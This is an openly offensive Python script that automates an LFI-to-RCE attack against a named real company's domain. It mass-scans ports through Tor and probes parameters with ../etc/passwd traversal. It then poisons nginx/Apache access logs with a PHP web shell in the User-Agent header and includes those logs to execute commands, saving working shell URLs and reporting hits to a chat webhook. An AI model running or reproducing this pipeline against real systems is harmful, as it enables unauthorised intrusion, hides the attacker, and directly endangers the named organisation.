import os
import subprocess
import threading
import requests
import json
import time
from queue import Queue

# =========================
# CONFIG
TARGETS = ["https://viettel.com.vn"]
PORTS = "80,443,8000-9000"
PROXIES = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"} # optional TOR
WEBHOOK_URL = ""  # Discord/Telegram webhook
MAX_THREADS = 20
REPORT_DIR = "reports"
LOG_PATHS = [
    "../../../../../../var/log/nginx/access.log",
    "../../../../../../var/log/httpd/access_log",
    "../../../../../../var/log/apache2/access.log"
]
# =========================

queue = Queue()

def notify(msg):
    if not WEBHOOK_URL:
        print(msg)
        return
    try:
        requests.post(WEBHOOK_URL, json={"content": msg})
    except:
        print("[!] Notify error")

def masscan_scan(target):
    cmd = f"masscan {target} -p{PORTS} --rate=1000 -oJ masscan_result.json"
    os.system(cmd)
    with open("masscan_result.json") as f:
        data = json.load(f)
    hosts = set()
    for entry in data:
        ip = entry['ip']
        port = entry['ports'][0]['port']
        hosts.add(f"http://{ip}:{port}")
    return list(hosts)

def poison_log(url):
    payload = "<?php system($_GET['cmd']); ?>"
    try:
        requests.get(url, headers={"User-Agent": payload}, proxies=PROXIES, timeout=10, verify=False)
    except:
        pass

def check_lfi(url, param, file):
    try:
        r = requests.get(url, params={param: file}, proxies=PROXIES, timeout=10, verify=False)
        return "root:x:0:0" in r.text
    except:
        return False

def check_rce(url, param, logpath):
    try:
        r = requests.get(url, params={param: logpath, "cmd": "id"}, proxies=PROXIES, timeout=10, verify=False)
        if "uid=" in r.text:
            notify(f"[+] RCE found: {url} via {logpath}")
            with open(f"{REPORT_DIR}/shells.txt", "a") as f:
                f.write(f"{url}?{param}={logpath}&cmd=COMMAND\n")
            return True
    except:
        pass
    return False

def worker():
    while not queue.empty():
        target = queue.get()
        for param in ["file", "page", "$__redirect"]:
            if check_lfi(target, param, "../../../../../../etc/passwd"):
                notify(f"[+] LFI found: {target} param={param}")
                poison_log(target)
                time.sleep(5)
                for logpath in LOG_PATHS:
                    if check_rce(target, param, logpath):
                        break
        queue.task_done()

def main():
    os.makedirs(REPORT_DIR, exist_ok=True)
    for t in TARGETS:
        hosts = masscan_scan(t)
        for h in hosts:
            queue.put(h)

    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    notify("[+] Advanced LFI ➔ RCE pipeline completed.")

if __name__ == "__main__":
    main()
